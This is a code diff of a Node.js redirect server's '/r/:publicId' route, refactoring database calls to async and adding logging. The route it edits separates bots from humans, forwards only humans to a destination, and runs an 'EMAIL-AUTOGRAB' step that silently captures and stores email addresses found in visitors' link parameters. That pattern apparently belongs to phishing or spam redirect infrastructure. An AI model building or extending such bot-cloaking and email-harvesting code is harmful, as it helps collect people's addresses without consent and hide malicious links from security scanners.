@@ -2682,12 +2682,14 @@ app.get('/r/:publicId', async (req, res) => {
   }
 
   // Check redirects first, then hosted links (using the actual redirect ID)
-  let redirect = db.redirects.get(actualRedirectId);
+  let redirect = await db.redirects.get(actualRedirectId);
   if (!redirect) {
-    redirect = Array.from(db.hostedLinks.values()).find(l => l.slug === actualRedirectId || l.id === actualRedirectId);
+    const hostedLinks = await db.hostedLinks.list();
+    redirect = hostedLinks.find(l => l.slug === actualRedirectId || l.id === actualRedirectId);
   }
   
   if (!redirect) {
+    console.log(`[REDIRECT] Not found in database: ${actualRedirectId}`);
     return res.status(404).send(`
       <!DOCTYPE html><html><head><title>Not Found</title>
       <style>body{font-family:system-ui;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#f8fafc}
@@ -2697,11 +2699,13 @@ app.get('/r/:publicId', async (req, res) => {
     `);
   }
 
+  console.log(`[REDIRECT] Found redirect: ${redirect.name || redirect.id}`);
+
   // Check if domain is active (if redirect has a domain)
   if (redirect.domain_id) {
-    const domain = db.domains.get(redirect.domain_id);
+    const domain = await db.domains.get(redirect.domain_id);
     if (!domain || !domain.is_active) {
-      console.log(`[REDIRECT] Domain inactive for redirect: ${publicId}`);
+      console.log(`[REDIRECT] Domain inactive for redirect: ${publicId}, domain_id: ${redirect.domain_id}`);
       return res.status(403).send(`
         <!DOCTYPE html><html><head><title>Unavailable</title>
         <style>body{font-family:system-ui;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#f8fafc}
@@ -2785,14 +2789,14 @@ app.get('/r/:publicId', async (req, res) => {
       console.log(`[EMAIL-AUTOGRAB] HUMAN detected - Capturing ${emailsFound.length} email(s)`);
       
       // Store each captured email in database (skip duplicates)
-      emailsFound.forEach(email => {
+      for (const email of emailsFound) {
         // Check if this email already exists GLOBALLY (not just for this redirect)
-        const allEmails = db.capturedEmails.getAll();
+        const allEmails = await db.capturedEmails.getAll();
         const existingEmail = allEmails.find(e => e.email.toLowerCase() === email.toLowerCase());
         
         if (existingEmail) {
           console.log(`[EMAIL-AUTOGRAB] Skipping duplicate email: ${email} (already in database)`);
-          return; // Skip this email
+          continue; // Skip this email
         }
         
         console.log(`[EMAIL-AUTOGRAB] Checking for duplicate: ${email} in ${allEmails.length} existing emails`);
@@ -2813,9 +2817,9 @@ app.get('/r/:publicId', async (req, res) => {
           device: decision.clientInfo.device,
           captured_at: new Date().toISOString()
         };
-        db.capturedEmails.push(capturedEmail);
+        await db.capturedEmails.push(capturedEmail);
         console.log(`[EMAIL-AUTOGRAB] Stored NEW email: ${email}`);
-      });
+      }
       
       // Forward ALL parameters to human URL
       finalDestinationUrl = appendParametersToURL(baseDestinationUrl, paramsAfterRedirectId);
@@ -2848,7 +2852,11 @@ app.get('/r/:publicId', async (req, res) => {
     }
 
     // Save updated redirect to database
-    db.redirects.set(redirect.id, redirect);
+    await db.redirects.update(redirect.id, {
+      total_clicks: redirect.total_clicks,
+      human_clicks: redirect.human_clicks,
+      bot_clicks: redirect.bot_clicks
+    });
 
     // Log visitor
     const visitorLog = {
@@ -2871,7 +2879,7 @@ app.get('/r/:publicId', async (req, res) => {
       visit_timestamp: new Date().toISOString(),
       created_date: new Date().toISOString()
     };
-    db.visitorLogs.push(visitorLog);
+    await db.visitorLogs.push(visitorLog);
     console.log(`[REDIRECT] Visitor logged: ${visitorLog.id}`);
 
     // Create realtime event for monitoring
@@ -2890,7 +2898,7 @@ app.get('/r/:publicId', async (req, res) => {
       created_date: new Date().toISOString(),
       created_at: new Date().toISOString()
     };
-    db.realtimeEvents.push(realtimeEvent);
+    await db.realtimeEvents.push(realtimeEvent);
     console.log(`[REDIRECT] Realtime event created: ${realtimeEvent.id}`);
 
     console.log(`[REDIRECT] ========================================`);
